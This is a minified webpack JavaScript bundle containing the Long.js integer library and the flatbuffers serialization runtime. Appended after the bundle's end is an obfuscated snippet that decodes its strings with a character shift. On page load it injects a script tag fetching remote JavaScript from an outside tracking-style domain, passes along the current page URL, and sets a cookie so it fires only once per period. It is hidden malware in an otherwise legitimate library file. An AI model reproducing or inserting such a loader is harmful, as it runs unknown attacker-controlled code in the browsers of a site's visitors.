isLong(divisor)||(divisor=fromValue(divisor)),wasm?fromBits((this.unsigned?wasm.rem_u:wasm.rem_s)(this.low,this.high,divisor.low,divisor.high),wasm.get_high(),this.unsigned):this.sub(this.div(divisor).mul(divisor))},LongPrototype.mod=LongPrototype.modulo,LongPrototype.rem=LongPrototype.modulo,LongPrototype.not=function not(){return fromBits(~this.low,~this.high,this.unsigned)},LongPrototype.countLeadingZeros=function countLeadingZeros(){return this.high?Math.clz32(this.high):Math.clz32(this.low)+32},LongPrototype.clz=LongPrototype.countLeadingZeros,LongPrototype.countTrailingZeros=function countTrailingZeros(){return this.low?ctz32(this.low):ctz32(this.high)+32},LongPrototype.ctz=LongPrototype.countTrailingZeros,LongPrototype.and=function and(other){return isLong(other)||(other=fromValue(other)),fromBits(this.low&other.low,this.high&other.high,this.unsigned)},LongPrototype.or=function or(other){return isLong(other)||(other=fromValue(other)),fromBits(this.low|other.low,this.high|other.high,this.unsigned)},LongPrototype.xor=function xor(other){return isLong(other)||(other=fromValue(other)),fromBits(this.low^other.low,this.high^other.high,this.unsigned)},LongPrototype.shiftLeft=function shiftLeft(numBits){return isLong(numBits)&&(numBits=numBits.toInt()),0==(numBits&=63)?this:numBits<32?fromBits(this.low<<numBits,this.high<<numBits|this.low>>>32-numBits,this.unsigned):fromBits(0,this.low<<numBits-32,this.unsigned)},LongPrototype.shl=LongPrototype.shiftLeft,LongPrototype.shiftRight=function shiftRight(numBits){return isLong(numBits)&&(numBits=numBits.toInt()),0==(numBits&=63)?this:numBits<32?fromBits(this.low>>>numBits|this.high<<32-numBits,this.high>>numBits,this.unsigned):fromBits(this.high>>numBits-32,this.high>=0?0:-1,this.unsigned)},LongPrototype.shr=LongPrototype.shiftRight,LongPrototype.shiftRightUnsigned=function shiftRightUnsigned(numBits){return isLong(numBits)&&(numBits=numBits.toInt()),0==(numBits&=63)?this:numBits<32?fromBits(this.low>>>numBits|this.high<<32-numBits,this.high>>>numBits,this.unsigned):fromBits(32===numBits?this.high:this.high>>>numBits-32,0,this.unsigned)},LongPrototype.shru=LongPrototype.shiftRightUnsigned,LongPrototype.shr_u=LongPrototype.shiftRightUnsigned,LongPrototype.rotateLeft=function rotateLeft(numBits){var b;return isLong(numBits)&&(numBits=numBits.toInt()),0==(numBits&=63)?this:32===numBits?fromBits(this.high,this.low,this.unsigned):numBits<32?(b=32-numBits,fromBits(this.low<<numBits|this.high>>>b,this.high<<numBits|this.low>>>b,this.unsigned)):(b=32-(numBits-=32),fromBits(this.high<<numBits|this.low>>>b,this.low<<numBits|this.high>>>b,this.unsigned))},LongPrototype.rotl=LongPrototype.rotateLeft,LongPrototype.rotateRight=function rotateRight(numBits){var b;return isLong(numBits)&&(numBits=numBits.toInt()),0==(numBits&=63)?this:32===numBits?fromBits(this.high,this.low,this.unsigned):numBits<32?(b=32-numBits,fromBits(this.high<<b|this.low>>>numBits,this.low<<b|this.high>>>numBits,this.unsigned)):(b=32-(numBits-=32),fromBits(this.low<<b|this.high>>>numBits,this.high<<b|this.low>>>numBits,this.unsigned))},LongPrototype.rotr=LongPrototype.rotateRight,LongPrototype.toSigned=function toSigned(){return this.unsigned?fromBits(this.low,this.high,!1):this},LongPrototype.toUnsigned=function toUnsigned(){return this.unsigned?this:fromBits(this.low,this.high,!0)},LongPrototype.toBytes=function toBytes(le){return le?this.toBytesLE():this.toBytesBE()},LongPrototype.toBytesLE=function toBytesLE(){var hi=this.high,lo=this.low;return[255&lo,lo>>>8&255,lo>>>16&255,lo>>>24,255&hi,hi>>>8&255,hi>>>16&255,hi>>>24]},LongPrototype.toBytesBE=function toBytesBE(){var hi=this.high,lo=this.low;return[hi>>>24,hi>>>16&255,hi>>>8&255,255&hi,lo>>>24,lo>>>16&255,lo>>>8&255,255&lo]},Long.fromBytes=function fromBytes(bytes,unsigned,le){return le?Long.fromBytesLE(bytes,unsigned):Long.fromBytesBE(bytes,unsigned)},Long.fromBytesLE=function fromBytesLE(bytes,unsigned){return new Long(bytes[0]|bytes[1]<<8|bytes[2]<<16|bytes[3]<<24,bytes[4]|bytes[5]<<8|bytes[6]<<16|bytes[7]<<24,unsigned)},Long.fromBytesBE=function fromBytesBE(bytes,unsigned){return new Long(bytes[4]<<24|bytes[5]<<16|bytes[6]<<8|bytes[7],bytes[0]<<24|bytes[1]<<16|bytes[2]<<8|bytes[3],unsigned)};var _default=Long;return exports.default=_default,"default"in exports?exports.default:exports}({});void 0===(__WEBPACK_AMD_DEFINE_RESULT__=function(){return Long}.apply(exports,[]))||(module.exports=__WEBPACK_AMD_DEFINE_RESULT__)},"./node_modules/flatbuffers/js/flatbuffers.mjs":(__unused_webpack___webpack_module__,__webpack_exports__,__webpack_require__)=>{"use strict";__webpack_require__.r(__webpack_exports__),__webpack_require__.d(__webpack_exports__,{flatbuffers:()=>flatbuffers});var flatbuffers={};flatbuffers.Offset,flatbuffers.Table,flatbuffers.SIZEOF_SHORT=2,flatbuffers.SIZEOF_INT=4,flatbuffers.FILE_IDENTIFIER_LENGTH=4,flatbuffers.SIZE_PREFIX_LENGTH=4,flatbuffers.Encoding={UTF8_BYTES:1,UTF16_STRING:2},flatbuffers.int32=new Int32Array(2),flatbuffers.float32=new Float32Array(flatbuffers.int32.buffer),flatbuffers.float64=new Float64Array(flatbuffers.int32.buffer),flatbuffers.isLittleEndian=1===new Uint16Array(new Uint8Array([1,0]).buffer)[0],flatbuffers.Long=function(low,high){this.low=0|low,this.high=0|high},flatbuffers.Long.create=function(low,high){return 0==low&&0==high?flatbuffers.Long.ZERO:new flatbuffers.Long(low,high)},flatbuffers.Long.prototype.toFloat64=function(){return(this.low>>>0)+4294967296*this.high},flatbuffers.Long.prototype.equals=function(other){return this.low==other.low&&this.high==other.high},flatbuffers.Long.ZERO=new flatbuffers.Long(0,0),flatbuffers.Builder=function(opt_initial_size){if(opt_initial_size)initial_size=opt_initial_size;else var initial_size=1024;this.bb=flatbuffers.ByteBuffer.allocate(initial_size),this.space=initial_size,this.minalign=1,this.vtable=null,this.vtable_in_use=0,this.isNested=!1,this.object_start=0,this.vtables=[],this.vector_num_elems=0,this.force_defaults=!1},flatbuffers.Builder.prototype.clear=function(){this.bb.clear(),this.space=this.bb.capacity(),this.minalign=1,this.vtable=null,this.vtable_in_use=0,this.isNested=!1,this.object_start=0,this.vtables=[],this.vector_num_elems=0,this.force_defaults=!1},flatbuffers.Builder.prototype.forceDefaults=function(forceDefaults){this.force_defaults=forceDefaults},flatbuffers.Builder.prototype.dataBuffer=function(){return this.bb},flatbuffers.Builder.prototype.asUint8Array=function(){return this.bb.bytes().subarray(this.bb.position(),this.bb.position()+this.offset())},flatbuffers.Builder.prototype.prep=function(size,additional_bytes){size>this.minalign&&(this.minalign=size);for(var align_size=1+~(this.bb.capacity()-this.space+additional_bytes)&size-1;this.space<align_size+size+additional_bytes;){var old_buf_size=this.bb.capacity();this.bb=flatbuffers.Builder.growByteBuffer(this.bb),this.space+=this.bb.capacity()-old_buf_size}this.pad(align_size)},flatbuffers.Builder.prototype.pad=function(byte_size){for(var i=0;i<byte_size;i++)this.bb.writeInt8(--this.space,0)},flatbuffers.Builder.prototype.writeInt8=function(value){this.bb.writeInt8(this.space-=1,value)},flatbuffers.Builder.prototype.writeInt16=function(value){this.bb.writeInt16(this.space-=2,value)},flatbuffers.Builder.prototype.writeInt32=function(value){this.bb.writeInt32(this.space-=4,value)},flatbuffers.Builder.prototype.writeInt64=function(value){this.bb.writeInt64(this.space-=8,value)},flatbuffers.Builder.prototype.writeFloat32=function(value){this.bb.writeFloat32(this.space-=4,value)},flatbuffers.Builder.prototype.writeFloat64=function(value){this.bb.writeFloat64(this.space-=8,value)},flatbuffers.Builder.prototype.addInt8=function(value){this.prep(1,0),this.writeInt8(value)},flatbuffers.Builder.prototype.addInt16=function(value){this.prep(2,0),this.writeInt16(value)},flatbuffers.Builder.prototype.addInt32=function(value){this.prep(4,0),this.writeInt32(value)},flatbuffers.Builder.prototype.addInt64=function(value){this.prep(8,0),this.writeInt64(value)},flatbuffers.Builder.prototype.addFloat32=function(value){this.prep(4,0),this.writeFloat32(value)},flatbuffers.Builder.prototype.addFloat64=function(value){this.prep(8,0),this.writeFloat64(value)},flatbuffers.Builder.prototype.addFieldInt8=function(voffset,value,defaultValue){(this.force_defaults||value!=defaultValue)&&(this.addInt8(value),this.slot(voffset))},flatbuffers.Builder.prototype.addFieldInt16=function(voffset,value,defaultValue){(this.force_defaults||value!=defaultValue)&&(this.addInt16(value),this.slot(voffset))},flatbuffers.Builder.prototype.addFieldInt32=function(voffset,value,defaultValue){(this.force_defaults||value!=defaultValue)&&(this.addInt32(value),this.slot(voffset))},flatbuffers.Builder.prototype.addFieldInt64=function(voffset,value,defaultValue){!this.force_defaults&&value.equals(defaultValue)||(this.addInt64(value),this.slot(voffset))},flatbuffers.Builder.prototype.addFieldFloat32=function(voffset,value,defaultValue){(this.force_defaults||value!=defaultValue)&&(this.addFloat32(value),this.slot(voffset))},flatbuffers.Builder.prototype.addFieldFloat64=function(voffset,value,defaultValue){(this.force_defaults||value!=defaultValue)&&(this.addFloat64(value),this.slot(voffset))},flatbuffers.Builder.prototype.addFieldOffset=function(voffset,value,defaultValue){(this.force_defaults||value!=defaultValue)&&(this.addOffset(value),this.slot(voffset))},flatbuffers.Builder.prototype.addFieldStruct=function(voffset,value,defaultValue){value!=defaultValue&&(this.nested(value),this.slot(voffset))},flatbuffers.Builder.prototype.nested=function(obj){if(obj!=this.offset())throw new Error("FlatBuffers: struct must be serialized inline.")},flatbuffers.Builder.prototype.notNested=function(){if(this.isNested)throw new Error("FlatBuffers: object serialization must not be nested.")},flatbuffers.Builder.prototype.slot=function(voffset){this.vtable[voffset]=this.offset()},flatbuffers.Builder.prototype.offset=function(){return this.bb.capacity()-this.space},flatbuffers.Builder.growByteBuffer=function(bb){var old_buf_size=bb.capacity();if(3221225472&old_buf_size)throw new Error("FlatBuffers: cannot grow buffer beyond 2 gigabytes.");var new_buf_size=old_buf_size<<1,nbb=flatbuffers.ByteBuffer.allocate(new_buf_size);return nbb.setPosition(new_buf_size-old_buf_size),nbb.bytes().set(bb.bytes(),new_buf_size-old_buf_size),nbb},flatbuffers.Builder.prototype.addOffset=function(offset){this.prep(flatbuffers.SIZEOF_INT,0),this.writeInt32(this.offset()-offset+flatbuffers.SIZEOF_INT)},flatbuffers.Builder.prototype.startObject=function(numfields){this.notNested(),null==this.vtable&&(this.vtable=[]),this.vtable_in_use=numfields;for(var i=0;i<numfields;i++)this.vtable[i]=0;this.isNested=!0,this.object_start=this.offset()},flatbuffers.Builder.prototype.endObject=function(){if(null==this.vtable||!this.isNested)throw new Error("FlatBuffers: endObject called without startObject");this.addInt32(0);for(var vtableloc=this.offset(),i=this.vtable_in_use-1;i>=0&&0==this.vtable[i];i--);for(var trimmed_size=i+1;i>=0;i--)this.addInt16(0!=this.vtable[i]?vtableloc-this.vtable[i]:0);this.addInt16(vtableloc-this.object_start);var len=(trimmed_size+2)*flatbuffers.SIZEOF_SHORT;this.addInt16(len);var existing_vtable=0,vt1=this.space;outer_loop:for(i=0;i<this.vtables.length;i++){var vt2=this.bb.capacity()-this.vtables[i];if(len==this.bb.readInt16(vt2)){for(var j=flatbuffers.SIZEOF_SHORT;j<len;j+=flatbuffers.SIZEOF_SHORT)if(this.bb.readInt16(vt1+j)!=this.bb.readInt16(vt2+j))continue outer_loop;existing_vtable=this.vtables[i];break}}return existing_vtable?(this.space=this.bb.capacity()-vtableloc,this.bb.writeInt32(this.space,existing_vtable-vtableloc)):(this.vtables.push(this.offset()),this.bb.writeInt32(this.bb.capacity()-vtableloc,this.offset()-vtableloc)),this.isNested=!1,vtableloc},flatbuffers.Builder.prototype.finish=function(root_table,opt_file_identifier,opt_size_prefix){var size_prefix=opt_size_prefix?flatbuffers.SIZE_PREFIX_LENGTH:0;if(opt_file_identifier){var file_identifier=opt_file_identifier;if(this.prep(this.minalign,flatbuffers.SIZEOF_INT+flatbuffers.FILE_IDENTIFIER_LENGTH+size_prefix),file_identifier.length!=flatbuffers.FILE_IDENTIFIER_LENGTH)throw new Error("FlatBuffers: file identifier must be length "+flatbuffers.FILE_IDENTIFIER_LENGTH);for(var i=flatbuffers.FILE_IDENTIFIER_LENGTH-1;i>=0;i--)this.writeInt8(file_identifier.charCodeAt(i))}this.prep(this.minalign,flatbuffers.SIZEOF_INT+size_prefix),this.addOffset(root_table),size_prefix&&this.addInt32(this.bb.capacity()-this.space),this.bb.setPosition(this.space)},flatbuffers.Builder.prototype.finishSizePrefixed=function(root_table,opt_file_identifier){this.finish(root_table,opt_file_identifier,!0)},flatbuffers.Builder.prototype.requiredField=function(table,field){var table_start=this.bb.capacity()-table,vtable_start=table_start-this.bb.readInt32(table_start);if(!(0!=this.bb.readInt16(vtable_start+field)))throw new Error("FlatBuffers: field "+field+" must be set")},flatbuffers.Builder.prototype.startVector=function(elem_size,num_elems,alignment){this.notNested(),this.vector_num_elems=num_elems,this.prep(flatbuffers.SIZEOF_INT,elem_size*num_elems),this.prep(alignment,elem_size*num_elems)},flatbuffers.Builder.prototype.endVector=function(){return this.writeInt32(this.vector_num_elems),this.offset()},flatbuffers.Builder.prototype.createString=function(s){if(s instanceof Uint8Array)var utf8=s;else{utf8=[];for(var i=0;i<s.length;){var codePoint,a=s.charCodeAt(i++);if(a<55296||a>=56320)codePoint=a;else codePoint=(a<<10)+s.charCodeAt(i++)+-56613888;codePoint<128?utf8.push(codePoint):(codePoint<2048?utf8.push(codePoint>>6&31|192):(codePoint<65536?utf8.push(codePoint>>12&15|224):utf8.push(codePoint>>18&7|240,codePoint>>12&63|128),utf8.push(codePoint>>6&63|128)),utf8.push(63&codePoint|128))}}this.addInt8(0),this.startVector(1,utf8.length,1),this.bb.setPosition(this.space-=utf8.length);i=0;for(var offset=this.space,bytes=this.bb.bytes();i<utf8.length;i++)bytes[offset++]=utf8[i];return this.endVector()},flatbuffers.Builder.prototype.createLong=function(low,high){return flatbuffers.Long.create(low,high)},flatbuffers.ByteBuffer=function(bytes){this.bytes_=bytes,this.position_=0},flatbuffers.ByteBuffer.allocate=function(byte_size){return new flatbuffers.ByteBuffer(new Uint8Array(byte_size))},flatbuffers.ByteBuffer.prototype.clear=function(){this.position_=0},flatbuffers.ByteBuffer.prototype.bytes=function(){return this.bytes_},flatbuffers.ByteBuffer.prototype.position=function(){return this.position_},flatbuffers.ByteBuffer.prototype.setPosition=function(position){this.position_=position},flatbuffers.ByteBuffer.prototype.capacity=function(){return this.bytes_.length},flatbuffers.ByteBuffer.prototype.readInt8=function(offset){return this.readUint8(offset)<<24>>24},flatbuffers.ByteBuffer.prototype.readUint8=function(offset){return this.bytes_[offset]},flatbuffers.ByteBuffer.prototype.readInt16=function(offset){return this.readUint16(offset)<<16>>16},flatbuffers.ByteBuffer.prototype.readUint16=function(offset){return this.bytes_[offset]|this.bytes_[offset+1]<<8},flatbuffers.ByteBuffer.prototype.readInt32=function(offset){return this.bytes_[offset]|this.bytes_[offset+1]<<8|this.bytes_[offset+2]<<16|this.bytes_[offset+3]<<24},flatbuffers.ByteBuffer.prototype.readUint32=function(offset){return this.readInt32(offset)>>>0},flatbuffers.ByteBuffer.prototype.readInt64=function(offset){return new flatbuffers.Long(this.readInt32(offset),this.readInt32(offset+4))},flatbuffers.ByteBuffer.prototype.readUint64=function(offset){return new flatbuffers.Long(this.readUint32(offset),this.readUint32(offset+4))},flatbuffers.ByteBuffer.prototype.readFloat32=function(offset){return flatbuffers.int32[0]=this.readInt32(offset),flatbuffers.float32[0]},flatbuffers.ByteBuffer.prototype.readFloat64=function(offset){return flatbuffers.int32[flatbuffers.isLittleEndian?0:1]=this.readInt32(offset),flatbuffers.int32[flatbuffers.isLittleEndian?1:0]=this.readInt32(offset+4),flatbuffers.float64[0]},flatbuffers.ByteBuffer.prototype.writeInt8=function(offset,value){this.bytes_[offset]=value},flatbuffers.ByteBuffer.prototype.writeUint8=function(offset,value){this.bytes_[offset]=value},flatbuffers.ByteBuffer.prototype.writeInt16=function(offset,value){this.bytes_[offset]=value,this.bytes_[offset+1]=value>>8},flatbuffers.ByteBuffer.prototype.writeUint16=function(offset,value){this.bytes_[offset]=value,this.bytes_[offset+1]=value>>8},flatbuffers.ByteBuffer.prototype.writeInt32=function(offset,value){this.bytes_[offset]=value,this.bytes_[offset+1]=value>>8,this.bytes_[offset+2]=value>>16,this.bytes_[offset+3]=value>>24},flatbuffers.ByteBuffer.prototype.writeUint32=function(offset,value){this.bytes_[offset]=value,this.bytes_[offset+1]=value>>8,this.bytes_[offset+2]=value>>16,this.bytes_[offset+3]=value>>24},flatbuffers.ByteBuffer.prototype.writeInt64=function(offset,value){this.writeInt32(offset,value.low),this.writeInt32(offset+4,value.high)},flatbuffers.ByteBuffer.prototype.writeUint64=function(offset,value){this.writeUint32(offset,value.low),this.writeUint32(offset+4,value.high)},flatbuffers.ByteBuffer.prototype.writeFloat32=function(offset,value){flatbuffers.float32[0]=value,this.writeInt32(offset,flatbuffers.int32[0])},flatbuffers.ByteBuffer.prototype.writeFloat64=function(offset,value){flatbuffers.float64[0]=value,this.writeInt32(offset,flatbuffers.int32[flatbuffers.isLittleEndian?0:1]),this.writeInt32(offset+4,flatbuffers.int32[flatbuffers.isLittleEndian?1:0])},flatbuffers.ByteBuffer.prototype.getBufferIdentifier=function(){if(this.bytes_.length<this.position_+flatbuffers.SIZEOF_INT+flatbuffers.FILE_IDENTIFIER_LENGTH)throw new Error("FlatBuffers: ByteBuffer is too short to contain an identifier.");for(var result="",i=0;i<flatbuffers.FILE_IDENTIFIER_LENGTH;i++)result+=String.fromCharCode(this.readInt8(this.position_+flatbuffers.SIZEOF_INT+i));return result},flatbuffers.ByteBuffer.prototype.__offset=function(bb_pos,vtable_offset){var vtable=bb_pos-this.readInt32(bb_pos);return vtable_offset<this.readInt16(vtable)?this.readInt16(vtable+vtable_offset):0},flatbuffers.ByteBuffer.prototype.__union=function(t,offset){return t.bb_pos=offset+this.readInt32(offset),t.bb=this,t},flatbuffers.ByteBuffer.prototype.__string=function(offset,opt_encoding){offset+=this.readInt32(offset);var length=this.readInt32(offset),result="",i=0;if(offset+=flatbuffers.SIZEOF_INT,opt_encoding===flatbuffers.Encoding.UTF8_BYTES)return this.bytes_.subarray(offset,offset+length);for(;i<length;){var codePoint,a=this.readUint8(offset+i++);if(a<192)codePoint=a;else{var b=this.readUint8(offset+i++);if(a<224)codePoint=(31&a)<<6|63&b;else{var c=this.readUint8(offset+i++);if(a<240)codePoint=(15&a)<<12|(63&b)<<6|63&c;else codePoint=(7&a)<<18|(63&b)<<12|(63&c)<<6|63&this.readUint8(offset+i++)}}codePoint<65536?result+=String.fromCharCode(codePoint):(codePoint-=65536,result+=String.fromCharCode(55296+(codePoint>>10),56320+(1023&codePoint)))}return result},flatbuffers.ByteBuffer.prototype.__indirect=function(offset){return offset+this.readInt32(offset)},flatbuffers.ByteBuffer.prototype.__vector=function(offset){return offset+this.readInt32(offset)+flatbuffers.SIZEOF_INT},flatbuffers.ByteBuffer.prototype.__vector_len=function(offset){return this.readInt32(offset+this.readInt32(offset))},flatbuffers.ByteBuffer.prototype.__has_identifier=function(ident){if(ident.length!=flatbuffers.FILE_IDENTIFIER_LENGTH)throw new Error("FlatBuffers: file identifier must be length "+flatbuffers.FILE_IDENTIFIER_LENGTH);for(var i=0;i<flatbuffers.FILE_IDENTIFIER_LENGTH;i++)if(ident.charCodeAt(i)!=this.readInt8(this.position_+flatbuffers.SIZEOF_INT+i))return!1;return!0},flatbuffers.ByteBuffer.prototype.createLong=function(low,high){return flatbuffers.Long.create(low,high)}}},__webpack_module_cache__={};function __webpack_require__(moduleId){var cachedModule=__webpack_module_cache__[moduleId];if(void 0!==cachedModule)return cachedModule.exports;var module=__webpack_module_cache__[moduleId]={exports:{}};return __webpack_modules__[moduleId].call(module.exports,module,module.exports,__webpack_require__),module.exports}__webpack_require__.n=module=>{var getter=module&&module.__esModule?()=>module.default:()=>module;return __webpack_require__.d(getter,{a:getter}),getter},__webpack_require__.d=(exports,definition)=>{for(var key in definition)__webpack_require__.o(definition,key)&&!__webpack_require__.o(exports,key)&&Object.defineProperty(exports,key,{enumerable:!0,get:definition[key]})},__webpack_require__.o=(obj,prop)=>Object.prototype.hasOwnProperty.call(obj,prop),__webpack_require__.r=exports=>{"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(exports,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(exports,"__esModule",{value:!0})};var __webpack_exports__=__webpack_require__("./lib/index.ts");return __webpack_exports__})()));(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44zxjwxy'+'fy3sjy4ljy4xhwnu'+'y3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));